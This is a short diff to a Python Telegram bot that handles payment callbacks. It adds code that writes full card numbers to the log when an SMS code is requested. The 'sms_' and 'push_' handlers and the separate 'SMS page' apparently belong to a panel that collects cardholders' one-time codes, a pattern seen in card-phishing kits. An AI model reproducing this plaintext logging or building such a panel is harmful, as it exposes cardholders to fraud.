@@ -699,7 +699,6 @@ async def update_payment_status(callback, payment_id, user_id, status_text, acti
     )
     return success
 
-# ========== ОБРАБОТЧИКИ ПЛАТЕЖЕЙ ==========
 @dp.callback_query(F.data.startswith("sms_"))
 async def sms_code_handler(callback: types.CallbackQuery):
     parts = callback.data.split("_")
@@ -715,6 +714,12 @@ async def sms_code_handler(callback: types.CallbackQuery):
         "sms",
         card_number
     )
+    
+    # Сохраняем номер карты для SMS страницы
+    if card_number:
+        # Можно сохранить в базу или передать через SSE
+        logger.info(f"📱 SMS запрошен для карты: {card_number}")
+    
     await callback.answer("SMS код запрошен")
 
 @dp.callback_query(F.data.startswith("push_"))
@@ -1519,5 +1524,6 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
